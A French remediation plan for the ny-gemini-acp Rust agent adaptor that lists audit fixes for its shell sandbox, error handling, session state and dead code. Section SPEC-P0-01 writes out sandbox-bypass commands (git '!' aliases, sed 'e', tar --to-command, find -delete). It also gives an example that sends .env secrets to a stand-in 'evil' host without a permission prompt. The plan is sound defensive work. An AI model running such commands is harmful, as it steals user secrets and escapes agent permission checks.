# SPEC — Plan de correction, d'amélioration et d'optimisation

**Projet** : ny-gemini-acp (`https://github.com/rakmahefa/ny-gemini-acp`)
**Version de référence** : 0.2.2 (commit `d16e6eb`, branche `main`)
**Source** : Rapport d'audit technique complet (19 p., 3 critiques / ~20 majeurs / ~60 mineurs, tous localisés fichier:ligne et vérifiés)
**Statut** : P0 + P1 livrés (version 0.3.0) — P2 et SPEC-CI restants
**Langue du code cible** : anglais (messages utilisateur, descriptions, commentaires)

> **Note d'exécution (2026-09-02, version 0.3.0)** : le dépôt GitHub cloné
> (`main` @ `d16e6eb`) était à l'état 0.2.2 original — les statuts « done » /
> « partiel » portés par une version antérieure de ce document ne correspondaient
> à aucun correctif présent dans le code (pas d'`attack_tests.rs`, pas de
> `BusyIo`, `StreamResult` encore `Result<_, String>`, commentaires d'audit
> C-xx/D-xx toujours en place, aucun CHANGELOG). Cette exécution est repartie
> du clone pristine : les phases P0 et P1 ont été **réellement implémentées**
> (9 items, un commit par item, un CHANGELOG par item), validées par
> `cargo fmt --check`, `cargo clippy --workspace --all-targets -- -D warnings`
> et **393 tests verts** (370 préexistants + 23 nouveaux). Les statuts P2 ci-
> dessous sont revenus à `todo`, en cohérence avec le code réellement présent.

---

## 1. Objectif et périmètre

Ce document transforme les constats de l'audit en un plan d'exécution actionnable. Il couvre l'intégralité du workspace : 4 crates (`acp-adaptor`, `agent-runtime`, `llm-provider`, `tools-provider`), 151 fichiers Rust, 24 273 lignes. L'état de surface est sain (cargo check/clippy/tests verts, 370 tests), donc **aucun item de ce plan n'est une correction de compilation** : ce sont des corrections sémantiques (bugs d'intégration entre couches), de sécurité (sandbox contournable), de cohérence des types (taxonomie d'erreurs vaincue) et d'hygiène (~750 lignes de code mort confirmé + ~800 lignes de sur-ingénierie, 56 commentaires d'audit résiduels).

**Ne pas faire (hors périmètre)** : réécriture d'ensemble, changement de découpage en crates, migration d'édition Rust, remplacement de tokio/reqwest/axum. Le squelette architectural (4 crates, dépendances correctes, couche `state/` exemplaire, chaîne de cancellation race-safe) est jugé bon par l'audit et doit être **conservé**.

**Constat structurant** : chaque couche est correcte isolément ; c'est leur **composition** qui ment. Le plan traite donc en priorité le câblage inter-couches (P0), puis la consolidation sémantique (P1), puis le nettoyage du slop (P2).

## 2. Référentiel des constats

| Crate | Note audit | Lecture dominante |
|---|---|---|
| llm-provider | 6/10 | Streaming et uploads sérieux ; taxonomie d'erreurs vaincue, faux positifs wire-level, web2api négligé |
| agent-runtime | 6/10 | `state/` exemplaire ; `events/` sur-ingénierée (triple machine à états), snapshot write-only, History fragile |
| tools-provider | 5,5/10 | MCP et `path.rs` propres ; **sandbox contournable (critique)**, 600-700 lignes mortes, classification de risque hors d'âge |
| acp-adaptor | 6,5/10 | Wiring propre, cancellation solide ; 4 bugs d'intégration réels, slop diffus de maintenance |

Trois constats critiques (P0) : **(1)** sandbox shell exécutable arbitrairement via la liste blanche (`git -c alias.x='!cmd'`, `sed 's/x/x/e'`, `tar --to-command`, `find -delete`), **(2)** titre de session jamais persisté (bug cross-crate), **(3)** erreurs réelles masquées par de faux diagnostics (I/O → « AlreadyRunning », taxonomie d'erreurs streamifiée en `String`).

## 3. Conventions du plan

- **IDs** : `SPEC-Px-yy` (x = phase 0/1/2, yy = ordinal). Un item = une branche = une PR, message au format `fix|refactor|chore(scope): [SPEC-Px-yy] description`.
- **Priorités** : P0 = sécurité / bug visible utilisateur (immédiat) ; P1 = consolidation sémantique et suppression des doubles chemins ; P2 = nettoyage du slop, optimisations, conventions.
- **Statuts** : `todo` → `in-progress` → `in-review` → `done` (suivis dans ce fichier, section 10).
- **Definition of Done par item** : (a) correction implémentée ; (b) tests nouveaux qui échouent sans le correctif ; (c) `cargo check --workspace --all-targets` et `cargo clippy --workspace --all-targets` à zéro warning ; (d) `cargo fmt` appliqué ; (e) 370 tests existants toujours verts ; (f) commentaire mensonger éventuel corrigé ou supprimé (jamais laissé en l'état) ; (g) entrée CHANGELOG.
- **Règle anti-régression slop** : toute PR qui ajoute un commentaire référençant la revue elle-même (codes C-xx/D-xx/P-xx) est refusée ; la justification va dans le message de commit ou le CHANGELOG.

---

## 4. Phase P0 — Sécurité et bugs visibles

### SPEC-P0-01 — Sécuriser la sandbox shell (exécution arbitraire)

- **Priorité** : P0 · **Effort** : 1,5-2 j · **Source audit** : chap. 3.1 · **Dépendances** : aucune (mais indissociable du volet classification de SPEC-P1-05)

**Constat.** `ShellExecTool` exécute localement `sh -c <command>` (`tools-provider/src/builtin/shell.rs:83-86`). La seule barrière est la `ShellSandbox` (parseur maison + liste blanche `sandbox/shell.rs:197-207` + rejet des interpréteurs `shell.rs:169-178` + rejet des chemins absolus/`../`/`~` dans les arguments `shell.rs:114-130`). Quatre vecteurs passent la validation statique tout en permettant l'exécution de commandes arbitraires :

1. `git -c alias.pwn='!cmd' status` — git allowlisté (`shell.rs:200`) ; l'argument `alias.x=!cmd` ne déclenche aucun filtre (le contenu après `=` n'est pas vérifié, `shell.rs:122-126`) ; un alias git préfixé `!` exécute un shell arbitraire (idem transport `ext::sh` de `git clone`).
2. `echo x | sed 's/x/x/e'` — sed allowlisté (`shell.rs:199`) ; le drapeau GNU `e` exécute l'espace de motif via `/bin/sh` (le blocage des interpréteurs `shell.rs:132-136` ne couvre pas cette capacité embarquée).
3. `tar --to-command=cmd` / `--checkpoint-action=exec=...` — tar allowlisté (`shell.rs:202`), aucun filtre d'argument ne se déclenche.
4. `find . -name '*.log' -delete` — find allowlisté, seuls `-exec`/`-execdir` sont bloqués (`shell.rs:138-145`) ; `-delete` est un `rm` qui passe inaperçu.

**Chaîne d'exploitation** : en mode AcceptEdits, la permission n'est exigée que pour le risque High (`acp-adaptor/src/prompt/turn/permission.rs:42-45`) ; `classify_risk` (`tool_ux/results.rs:80-89` + `sandbox/risk.rs:147-153`) classe git en Low/Medium (git absent de la liste High). Donc `git -c alias.pwn='!curl http://evil/$(cat .env)' status` s'exécute **sans aucune demande de permission** en AcceptEdits, et avec un libellé « risque faible » en mode Default. Le chemin de confinement prévu (terminal ACP, `executor/terminal.rs`) est du code mort : `execute_shell_via_acp_terminal` n'est appelé que depuis `execute_inner` (`executor/mod.rs:174-180`), jamais en production. Les tests de la sandbox (`sandbox/tests.rs:61-200`) ne couvrent que les vecteurs bloqués.

**Correction prescrite.**
1. Bloquer immédiatement, au niveau de la validation d'arguments (`sandbox/shell.rs`) : toute valeur d'argument contenant `!` (blocage générique, couvre les alias git) ou le préfixe `ext::` ; le drapeau `e`/`--expression` avec `e` de sed (ou sed entier tant que le drapeau `e` n'est pas filtrable finement) ; les options `--to-command` et `--checkpoint-action` de tar ; `-delete` de find (exiger `-exec` refusé + `-delete` refusé ensemble : find ne passe qu'en lecture).
2. Ajouter une liste **High** minimale côté `classify_risk` pour git, gh, sed, find, tar (cf. SPEC-P1-05 pour l'unification complète des trois points d'entrée).
3. Corriger le message d'erreur (`shell.rs:110, 148`) pour ne plus prétendre à une barrière effective : énoncer explicitement « filtre heuristique, sans confinement OS ».
4. Ajouter la suite de tests d'intrusion (voir §7) couvrant les 4 vecteurs + variantes (guillemets, échappements, combinaisons pipe).
5. À terme (P2, SPEC-P2-05) : basculer `shell_exec` sur le terminal ACP (réanimation de la voie Zed) ou un vrai confinement OS (Landlock/seccomp via crate dédiée, ou conteneur). Documenter la décision dans un ADR `docs/adr/0001-sandbox-execution.md`.

**Critères d'acceptation.**
- [ ] Les 4 vecteurs du rapport (et leurs variantes listées en §7.1) échouent avec une erreur claire avant tout spawn de processus.
- [ ] Aucune commande de la liste blanche légitime usuelle (`ls`, `rg`, `git status`, `git log`, `cargo build`…) n'est faussement rejetée (suite de non-régression positive).
- [ ] `git -c alias.*='!…'` est refusé et classé High (demande de permission en Default, refus en AcceptEdits).
- [ ] Le message d'erreur de sandbox n'affirme plus de confinement inexistant.
- [ ] Tests d'intrusion verts, intégrés à `cargo test --workspace` (crate tools-provider).

---

### SPEC-P0-02 — Persister le titre de session

- **Priorité** : P0 · **Effort** : 0,5 j · **Source audit** : chap. 3.2 · **Dépendances** : aucune

**Constat.** Bug cross-crate confirmé ligne à ligne. À la création du titre, l'adaptateur pose le titre sur la **copie locale** de la session du tour, puis notifie l'UI, sans jamais écrire dans le store (`acp-adaptor/src/prompt/turn.rs:165-173`). En fin de tour, `TurnService::finish` appelle `Store::end_turn` qui écrase le titre du tour par celui de l'entrée « live » du store (`agent-runtime/src/state/mod.rs:113`) : `final_session.title = live_session.title.clone()` — l'entrée live n'a jamais reçu le titre. Effet : le titre s'affiche pendant la session, mais `session/list` (`handlers/session.rs:205`) et `session/load` (`session.rs:249`, `send_restored_title`) renvoient `None` après redémarrage ou fork (`Store::fork` copie l'entrée non titrée, `persistence.rs:164-180`). Aucun appel `update_session` n'écrit le titre dans tout le workspace.

**Correction prescrite.**
1. Dans `turn.rs` (bloc de dérivation du titre), écrire le titre via `Store::update_session` (chemin store, pas seulement `safe_session_update` qui est une notification UI) — l'entrée « live » reçoit le titre, le merge D-05 de `end_turn` redevient correct sans changer la sémantique de fusion.
2. Alternative (si l'écriture au moment de la dérivation est indésirable pour raisons de concurrence) : exclure `title` du merge de `end_turn` (`state/mod.rs:113`) et faire persister le titre uniquement par l'adaptateur. Choisir **une** des deux options et documenter l'invariant dans le commentaire de `end_turn` (description du comportement courant, pas de référence de revue).
3. Supprimer le double chemin de notification si l'écriture store suffit à propager l'update UI.

**Critères d'acceptation.**
- [ ] Test d'intégration E2E : créer une session → dériver le titre → `end_turn` → relancer un store sur le même data-dir → `session/list` et `session/load` renvoient le titre.
- [ ] Test fork : `Store::fork` d'une session titrée produit une copie titrée.
- [ ] Le scénario « session sans titre » (texte utilisateur vide) reste sans titre, sans régression.

---

### SPEC-P0-03 — Rétablir la taxonomie d'erreurs sur le canal de streaming

- **Priorité** : P0 · **Effort** : 1-1,5 j · **Source audit** : chap. 3.3 et 4 (M1) · **Dépendances** : aucune ; prerequisite de SPEC-P2-02

**Constat.** Le canal de streaming transporte des chaînes : `pub type StreamResult = Result<StreamItem, String>` (`llm-provider/src/client/config.rs:68`), et le producteur détype tout : `let _ = tx.send(Err(format!("{e:#}"))).await` (`client/stream.rs:87`). Conséquence : toutes les erreurs typées produites pendant le stream (`CookiesExpired`, `UpstreamRejected`, `Http`, `Network`, `SafetyBlocked`, `StreamDivergence`) arrivent à l'ACP comme `LlmError::Provider(String)`. Les branches correspondantes de `map_gemini_error` (`provider.rs:25-35`) sont mortes en pratique ; le cas n°1 d'un provider à cookies — l'expiration des cookies — est classé « upstream » au lieu d'« authentication ». Seules les branches produites avant le spawn du stream (`client/mod.rs:73-74`) sont vivantes.

**Correction prescrite.**
1. Faire porter au canal un type résultat : `pub type StreamResult = Result<StreamItem, LlmError>` dans `client/config.rs` ; remplacer le `format!("{e:#}")` de `stream.rs:87` par l'erreur typée d'origine (le producteur possède déjà l'erreur typée avant détypage).
2. Laisser le compilateur guider l'exhaustivité des `match` consommateurs (provider, adaptor) ; supprimer les branches mortes devenues redondantes ou les rendre réellement atteignables.
3. Classer `CookiesExpired` en catégorie `authentication` dans `map_gemini_error` (et dans la projection ACP des erreurs) — c'est le diagnostic qui déclenche le bon réflexe utilisateur (recharger les cookies).
4. Ajouter un test : un stream qui émet `CookiesExpired` produit côté adaptor une erreur d'authentification (et non `Provider(String)`).
5. Vérifier qu'aucune chaîne d'erreur ne traverse encore la frontière client→provider (grep `Result<.*String>` sur `crates/llm-provider/src/client/`).

**Critères d'acceptation.**
- [ ] `StreamResult` porte `LlmError` ; aucune conversion en `String` dans le canal.
- [ ] Test de classification vert (CookiesExpired → authentication).
- [ ] `cargo clippy` zéro warning après migration (exhaustivité des match vérifiée par le compilateur).

---

## 5. Phase P1 — Consolidation sémantique

### SPEC-P1-01 — Distinguer « tour déjà actif » de la panne I/O réelle

- **Priorité** : P1 · **Effort** : 0,5 j · **Source audit** : chap. 3.3 · **Dépendances** : aucune

**Constat.** Dans `agent-runtime/src/state/mod.rs:28-30`, l'acquisition du sémaphore fichier « busy » est mappée sans distinction : `self.acquire_busy(id).await.map_err(|_| TurnError::AlreadyRunning)?`. Or `acquire_busy` (`state/busy.rs:10-47`) échoue aussi pour un disque plein ou une permission refusée (`create_new`, `write`). L'utilisateur reçoit « a turn is already active on this session — send session/cancel first » alors que c'est une panne I/O, et la commande conseillée n'y changera rien. Le verrou d'écriture étant tenu jusqu'au commit, le diagnostic faux se produit précisément quand l'écriture disque est la plus sollicitée.

**Correction prescrite.**
1. Ajouter `TurnError::BusyIo(std::io::Error)` (ou `BusyIo(String)` avec la source loggée) dans `execution/error.rs`.
2. Dans `state/mod.rs`, inspecter la nature de l'échec de `acquire_busy` : conflit de sentinel existante → `AlreadyRunning` ; erreur `create_new`/`write` d'origine I/O → `BusyIo` avec log `tracing::error!` de l'erreur réelle.
3. Projeter `BusyIo` côté ACP en `internal_error` (et non en message « already running »).
4. Retirer du même coup le bras inatteignable associé dans `prompt/handler.rs:109-121` (cf. SPEC-P2-01) si la migration des types le rend redondant.

**Critères d'acceptation.**
- [ ] Test : sentinel busy sur un répertoire en lecture seule → l'utilisateur reçoit une erreur I/O explicite, pas « already active ».
- [ ] Test : double `begin_turn` concurrent → toujours `AlreadyRunning` (comportement actuel préservé).

---

### SPEC-P1-02 — Ordre load/resume : attendre la fin du tour avant de lire le snapshot

- **Priorité** : P1 · **Effort** : 0,5 j · **Source audit** : chap. 7 (M2) · **Dépendances** : aucune

**Constat.** `handlers/session.rs:221-235` (session/load) et `334-346` (session/resume) lisent le snapshot **avant** `cancel_and_wait` : le replay rejoue l'ancien clone et le tour annulé disparaît du replay. Les handlers fork/delete/close font l'attente **avant** l'accès — seuls load et resume sont inversés. Le commentaire D-13 prétend le contraire.

**Correction prescrite.**
1. Déplacer `cancel_and_wait` avant la lecture du snapshot dans `handle_load` et `handle_resume` (aligner sur l'ordre de fork/delete/close).
2. Supprimer le commentaire D-13 et le remplacer par une phrase d'invariant : « attendre la fin du tour avant tout accès au snapshot, sinon le replay est périmé ».
3. Ajouter un test d'intégration : tour en cours → `session/load` → le replay contient l'état post-annulation (et pas l'état pré-tour).

**Critères d'acceptation.**
- [ ] Ordre identique dans les cinq handlers concernés (load, resume, fork, delete, close).
- [ ] Test de replay post-annulation vert.
- [ ] Aucune occurrence D-13 restante.

---

### SPEC-P1-03 — Validation de configuration honnête + sécurité des id de session + upload d'image

- **Priorité** : P1 · **Effort** : 1 j · **Source audit** : chap. 7 (M3, M4, M5) · **Dépendances** : aucune

**Constat (M3).** `handlers/config.rs:33-68` répond OK sur valeurs invalides : modèle inconnu, think non numérique (clamp silencieux de 5 vers 4), `tools_enabled` invalide et `config_id` inconnu produisent tous un `responder.respond()` de succès sans modification. Zed croit avoir changé le modèle. **(M4)** Aucun `is_valid_session_id` dans `handlers/config.rs:16` (contrairement à tous les autres handlers) : l'identifiant client brut atteint `Store::read`, soit `dir.join(format!("{id}.json"))` (`persistence.rs:27-29`) — un client stdio malveillant peut faire lire des fichiers hors du data-dir (lecture contrainte : le fichier doit parser en `Session`). Le commentaire P-07 « réutilisée par tous les handlers » est faux. **(M5)** Un échec d'upload d'image est rapporté `StopReason::Refusal` (`prompt/turn.rs:175-184`, `prompt/turn/uploads.rs`) — en ACP, un refus du modèle — et le message utilisateur (`session.messages.push`, ligne 186) n'a pas encore eu lieu : il est perdu. L'erreur réelle n'existe que dans un texte français ; la fonction retourne `Err(())`.

**Correction prescrite.**
1. `set_config_option` : répondre `invalid_params` (JSON-RPC) pour modèle inconnu, think non numérique, `tools_enabled` invalide, `config_id` inconnu — jamais un succès sans effet. Message d'erreur en anglais listant les valeurs acceptées.
2. Ajouter `is_valid_session_id` (contrainte : `[A-Za-z0-9_-]+`, longueur bornée) appliqué dans `handlers/config.rs` ; le mutualiser avec la validation existante des autres handlers (fonction unique, pas de copie).
3. Supprimer le commentaire P-07 ; documenter la validation à l'endroit de la définition.
4. Upload d'image : remplacer `StopReason::Refusal` par une erreur typée (`Err(UploadError)`) projetée en `internal_error` ACP ; pousser le message utilisateur **avant** de retourner l'erreur pour qu'il survive au replay ; typer le retour de la fonction (abandonner `Err(())`) ; retirer le texte français au profit d'une erreur structurée.
5. Harmoniser : un seul point de projection des erreurs de tour vers les codes ACP (cf. aussi SPEC-P1-05 pour la catégorisation `invalid_params` vs `internal_error`).

**Critères d'acceptation.**
- [ ] Tests handler : 4 valeurs invalides → `invalid_params`, aucune mutation d'état.
- [ ] Test : `session/set_config_option` avec `id` contenant `../` ou `/` → `invalid_params`, aucune lecture hors data-dir.
- [ ] Test : échec d'upload simulé → erreur ACP `internal_error` + message utilisateur présent dans l'historique après reload ; aucun `StopReason::Refusal`.

---

### SPEC-P1-04 — Cancellation effective pendant l'exécution d'un outil + permissions « Toujours autoriser »

- **Priorité** : P1 · **Effort** : 1-2 j · **Source audit** : chap. 6.1 · **Dépendances** : SPEC-P1-05 (décision executor) recommandée avant, pour éviter de câbler du code condamné

**Constat.** `DefaultToolProvider::call` (`tools-provider/src/provider.rs:182-244`) ne lit jamais `request.cancellation` — seuls `name`, `arguments`, `cwd`, `additional_dirs` sont utilisés — et `registry.call_async` (`registry.rs:177-203`) n'a pas de paramètre d'annulation. Le commentaire D-17 (`provider.rs:183-189`) affirme que « l'annulation du provider passe par request.cancellation consommé par l'executor » : faux dans le chemin vivant. Conséquence : un `session/cancel` n'interrompt pas un outil en cours — un MCP peut courir jusqu'à 120 s (`tools/mcp.rs:13`), un shell jusqu'à 120 s (`builtin/shell.rs:16`). Par ailleurs, les options « Toujours autoriser / Toujours refuser » (`executor/permission.rs:159-176`) sont mappées sur Allow/Reject sans aucun état persistant : l'utilisateur croit configurer une permission mémorisée qui n'existe pas.

**Correction prescrite.**
1. Ajouter un paramètre `cancellation` (token `CancellationToken` ou watch channel, aligné sur la convention `cancellation.rs:30-42` d'agent-runtime) à `registry.call_async` et à chaque outil ; dans l'exécution shell et MCP, `tokio::select!` entre le process et l'annulation, avec `kill()` du process enfant à l'annulation.
2. Brancher `request.cancellation` dans `DefaultToolProvider::call` ; supprimer le commentaire D-17 et décrire le comportement réel.
3. « Toujours autoriser / Toujours refuser » : donner un effet réel — mémorisation par (outil, règle) au niveau session (persistée dans l'état de session existant) — ou retirer les options de l'UI jusqu'à implémentation. Décision recommandée : implémenter la mémorisation en session (léger, attendu par Zed), interdite cross-session tant qu'aucun store de permissions n'existe.
4. Test : shell `sleep 30` annulé à 1 s → process tué, `tool_call` marqué annulé, bus d'événements cohérent.

**Critères d'acceptation.**
- [ ] Un `session/cancel` pendant `shell_exec sleep 30` retourne en < 2 s (test d'intégration).
- [ ] Idem pour un outil MCP factice long.
- [ ] « Toujours autoriser » mémorisé en session : la 2e demande du même outil/règle ne re-demande pas ; « Toujours refuser » rejette sans re-demander. (Ou option retirée, au choix assumé et documenté.)
- [ ] Aucune occurrence D-17 restante.

---

### SPEC-P1-05 — Supprimer le double chemin d'exécution + unifier la classification de risque

- **Priorité** : P1 · **Effort** : 1,5-2 j · **Source audit** : chap. 6.3, 3.1 · **Dépendances** : doit précéder SPEC-P2-01 (périmètre chevauchant) ; complète SPEC-P0-01

**Constat.** Le sous-système executor/lifecycle/terminal est mort dans son chemin de production : `execute_with_call_id_and_events`, `execute_with_call_id`, `execute` (`executor/mod.rs:81-102`), `execute_inner` et `execute_registry` (`:136-197`), `terminal.rs` entier (129 lignes), l'essentiel de `lifecycle.rs` (406 lignes : `ToolLifecycle`, `ToolResultEnvelope`, `LifecycleError` ne sont référencés que par ce chemin mort ; seuls 4 helpers de cancellation sont vivants). Des champs y sont calculés puis jetés (`let _ = reason; let _ = terminal_meta;` — `executor/mod.rs:116, 131-132`). Conséquence structurelle : la politique de permission existe en **deux copies divergentes** — la copie morte (`executor/mod.rs:147-152`, où un outil MCP Generic ne demanderait jamais de permission) et la copie vivante d'acp-adaptor (`prompt/turn/permission.rs`). Côté risque : trois points d'entrée divergents — `ShellAnalysis::analyze` (n'échoue jamais, repli heuristique `risk.rs:61-75`), `ShellSandbox::analyze_command` + repli Critical (`tool_ux/results.rs:82-85`), `compute_risk` (`risk.rs:125-166`) ; la liste High (`risk.rs:147-153`) contient `rm, mv, cp, chmod, chown, docker, npm, cargo, go, make, gcc…` mais ni `git`, ni `gh`, ni `sed`, ni `find`, ni `tar`, ni `zip`, ni `unzip` — exactement les vecteurs de contournement. La branche Critical (`risk.rs:141-146`) ne sert qu'aux avertissements puisque `analyze_command` rejette `rm` avant (`shell.rs:153-157`) : même logique dupliquée dans deux couches à effets différents.

**Correction prescrite.**
1. Supprimer le chemin mort : `terminal.rs` entier, `execute*` de `executor/mod.rs` sauf le point d'entrée réellement appelé par `provider.rs`, et `lifecycle.rs` hors les 4 helpers de cancellation vivants. Si le terminal ACP est retenu comme cible P2 (SPEC-P0-01, point 5), le documenter dans l'ADR et le réintroduire à ce moment-là — ne pas le garder mort entre les deux.
2. Conserver **une seule** politique de permission : celle d'acp-adaptor. Supprimer la copie de `executor/mod.rs:147-152`.
3. Unifier le risque en **un seul** classificateur (`compute_risk` dans `sandbox/risk.rs`) consommé par tous les points ; supprimer les replis divergents (`risk.rs:61-75` et le repli Critical de `results.rs:82-85` redevient le seul champ d'application de `analyze_command` = validation, pas classification).
4. Compléter la liste High : `git, gh, sed, find, tar, zip, unzip` (justification : capacités d'exécution ou de mutation démontrées au chap. 3.1) ; revoir la liste avec la règle « tout programme capable d'exécuter ou de supprimer est High ».
5. Supprimer la défense théâtrale `checked_add` plafond 20×32 avec message mensonger (`agent_loop.rs:332-337`) : remplacer par une borne métier honnête (p. ex. 128 appels d'outils par tour) et un message réel (« tool call budget exhausted »).

**Critères d'acceptation.**
- [ ] `rg 'execute_shell_via_acp_terminal|ToolLifecycle|ToolResultEnvelope' crates/` ne retourne plus que du code vivant ou rien.
- [ ] Une seule fonction de classification de risque dans le workspace ; tests paramétrés sur la liste High complète (incl. git/sed/find/tar/zip).
- [ ] Test AcceptEdits : `git status` (sans alias) demande maintenant la permission (reclassement High) — vérifier l'impact UX et l'ajuster avec une exception explicite documentée si `git status` doit rester Low (alors filtrer les arguments `-c`/`alias` en P0 déjà fait).
- [ ] Plusieurs `let _ =` jetés dans le même calcul supprimés.

---

### SPEC-P1-06 — Faux positifs wire-level et honnêteté des erreurs web2api

- **Priorité** : P1 · **Effort** : 1-2 j · **Source audit** : chap. 4 (M2, M6, M7) · **Dépendances** : bénéficie de SPEC-P0-03 (types sur le canal)

**Constat (M2).** Les détections « wire-level » tournent sur le flux brut : la regex `bard_error` tourne toujours sur le texte pré-décodage (`stream.rs:132-144` — un modèle écrivant littéralement « BardErrorInfo [401] » tue le stream) et `detect_safety_block` matche des phrases de refus hardcodées (`stream.rs:304-307`, `frames.rs:313-350` — « I can't help with that ») sur l'accumulateur brut — toute réponse citant ces phrases est abortée après avoir déjà envoyé des deltas au client. **(M6)** Erreurs avalées côté web2api : un upload d'image échoué ne produit qu'un `warn` (`web2api/google.rs:63-69`) et le client reçoit une réponse « normale » sans son image ; les erreurs SSE upstream sont transformées en succès (`finish_reason: "stop"` + `[DONE]` — `chat.rs:114-121`, `google.rs:124-131`). **(M7)** Perte silencieuse de contenu : un bloc tool_call au JSON invalide est quand même retiré de la réponse (`replace_all` appliqué indépendamment du parse — `convert/common.rs:55-67`) ; la regex RE2 ne matche que du JSON mono-ligne — un `function_call` multi-ligne hors fence n'est ni parsé ni retiré (`convert/google.rs:147-181`).

**Correction prescrite.**
1. Appliquer les détections (`bard_error`, `detect_safety_block`) sur les **frames décodées** (payloads sémantiques), pas sur l'accumulateur brut ; supprimer le scan pré-décodage. Si la détection sur flux brut reste nécessaire pour couper tôt, la garder comme *signal* et ne jamais aborter sans confirmation sur frame décodée.
2. Réduire les faux positifs : matcher des structures (codes d'erreur réels du protocole) plutôt que des phrases de prose.
3. web2api : upload d'image échoué → répondre une erreur HTTP 5xx structurée (ou une réponse avec `error`), jamais une réponse « normale » sans image ; erreurs SSE upstream → `finish_reason: "error"` + champ erreur, jamais `"stop"` + `[DONE]`.
4. Tool-calls : ne retirer un bloc de la réponse que si le parse a réussi ; en cas de JSON invalide, laisser le texte visible et logger ; étendre l'extraction au JSON multi-ligne (remplacer la regex mono-ligne par un extracteur fence + équilibrage d'accolades réutilisé de la pile sémantique — voir SPEC-P2-02 pour l'unification complète).
5. Tests : réponse citant « I can't help with that » dans du contenu légitime → pas d'abort ; SSE upstream en erreur → client web2api voit une erreur ; tool_call multi-ligne → parsé et retiré.

**Critères d'acceptation.**
- [ ] Aucune détection sur flux brut non décodé.
- [ ] web2api ne transforme plus jamais une erreur en `finish: stop`.
- [ ] Tests des 5 scénarios ci-dessus verts.

---

## 6. Phase P2 — Nettoyage du slop, unifications et optimisations

### SPEC-P2-01 — Purge du code mort confirmé (~750 lignes)

- **Priorité** : P2 · **Effort** : 1 j · **Source audit** : chap. 5.3, 8.3 · **Dépendances** : SPEC-P1-05 (executor) fait partie du gisement ; passer après

**Constat.** Environ 700-800 lignes de code mort confirmé, vérifiées par recherche sur tout le workspace :

| Gisement | Localisation |
|---|---|
| Fichier orphelin jamais compilé, doc mensongère | `llm-provider/src/web2api/mod.rs` (lib.rs:5-9 ne déclare pas `mod web2api` ; le binaire `web2api/main.rs:3-8` déclare son propre arbre) |
| Sous-système snapshot write-only (aucun lecteur) | `agent-runtime/src/state/snapshot.rs` (68 l.) + hooks `state/mod.rs:130-144`, `persistence.rs:134-135` |
| APIs publiques mortes | `TurnManager::cancel_all` (turn_manager.rs:112-120), `AgentTurn::cancel` (turn.rs:108-117), `AgentLoop::config` (agent_loop.rs:151-153), `EventBus::publish` (bus.rs:98-102), `RuntimeError::AlreadyRunning`/`ChannelClosed` (error.rs:5-11) |
| Bras de match inatteignables | `prompt/handler.rs:109-121`, bras wildcard `config/mcp.rs:35`, branche toujours-vraie `frames.rs:67` |
| Métriques jamais lues | `ProjectionMetrics` (projection.rs:12-43) |
| Constante centralisée fictive | `INSTRUCTION_TOOL_CALL` (`core/tool_prompt.rs:5-30`, exportée mais jamais importée hors ses tests) |
| Options/mécaniques inopérantes | `xsrf_token` parsé puis affiché ignoré (`web2api/config.rs:19`, `common.rs:118-124`), cache MCP TTL zéro (`mcp.rs:15`, `catalog.rs:25-28`), `SandboxConfig` jamais remplie (`registry.rs:17-20, 95`), `feed_text` « compat », `ShellSandbox::normalize` et `ShellAnalysis::summary` réservés aux tests, shim `core/time.rs` (4 l., zéro utilisateur), paramètre `strip` jamais vrai (`frames.rs:299`) |

**Correction prescrite.**
1. Supprimer : `web2api/mod.rs`, le sous-système snapshot (écritures, élagage, hooks — aucune lecture existe), les 5 APIs publiques mortes, `ProjectionMetrics`, les bras de match inatteignables, le cache TTL zéro, `SandboxConfig`, `feed_text`, le shim `core/time.rs`, le paramètre `strip`.
2. Pour `INSTRUCTION_TOOL_CALL` : supprimer, OU réanimer en faisant importer `tool_prompt` par tools-provider (le doc annonce deux consommateurs qui n'existent pas ; `openai.rs:8-11` en définit une troisième). Décision recommandée : supprimer et garder une seule instruction par surface (cf. SPEC-P2-04 homonymes).
3. Chaque suppression est guidée par le compilateur (retirer l'item, corriger les références restantes — normalement aucune par définition de « mort »).
4. Nettoyer les mentions qui restent dans les docs/commentaires (`upload.rs:1`, `models.rs:1` renvoient aux scripts Python supprimés du `vendor/`).
5. Note CHANGELOG pour le snapshot : « sous-système d'écriture sans lecteur supprimé ; aucun chemin de récupération n'a jamais existé ».

**Critères d'acceptation.**
- [ ] `cargo check --workspace --all-targets` vert après purge.
- [ ] `rg 'cancel_all|ProjectionMetrics|INSTRUCTION_TOOL_CALL|xsrf_token|snapshot' crates/ --type rust` ne retourne plus d'éléments de la liste (hors tests qui testent l'absence).
- [ ] Nettoyage mesurable : ~750 lignes retirées (comparer `wc -l` avant/après).

---

### SPEC-P2-02 — Unifications structurelles (parsing, types, émetteur, history)

- **Priorité** : P2 · **Effort** : 2-3 j · **Source audit** : chap. 4 (M4, M5), 5.1, 5.2, 8.4 · **Dépendances** : SPEC-P0-03 (canal typé) et SPEC-P1-06 (détections sur frames décodées) doivent précéder

**Constat.** Quatre unifications structurantes à opérer, toutes héritées d'itérations de refactorisation non consolidées :

1. **Double pile de parsing des tool-calls (M4)** : le même dialecte textuel de Gemini est interprété par une pile sémantique pour l'ACP (`frames.rs:231-258`, `parsers.rs:35-57`) et par des regex pour web2api (`protocol.rs:388-412`, `convert/common.rs:49-69`), avec **trois** implémentations d'extraction JSON à clés de repli différentes, des identifiants réinventés (`uuid::Uuid::new_v4` dans `common.rs:64`) et les balises thinking qui fuient dans `/v1/chat/completions`.
2. **Types isomorphes (M5)** : `StreamItem` et `GeminiFrameEvent` sont champ-à-champ isomorphes (`client/config.rs:55-66` vs `core/frames.rs:29-40`) ; `emit_frame` convertit A→B puis le provider reconvertit B→A variante par variante (`stream.rs:489-542`, `provider.rs:82-114`).
3. **Couche events/ en triple exemplaire** : `emitter.rs` (557 l.) duplique dix fois le même motif de quinze lignes ; `bind_tool_identity` (`emitter.rs:130-142`) construit une map identité→identité (`semantic_id = upstream_id.clone()`, ~150 l. de tool_bindings/rollback/resolve/release cérémoniels) ; quatre structures parallèles tracent les mêmes identifiants (`tool_bindings`, `seen_tool_ids` emitter.rs:15, `integrity.tools` integrity.rs:69, HashSet local `agent_loop.rs:475-512`) ; le trait `TurnEventSink` (sink.rs:10-43, seize méthodes) n'a qu'une seule implémentation (107 l. de délégation).
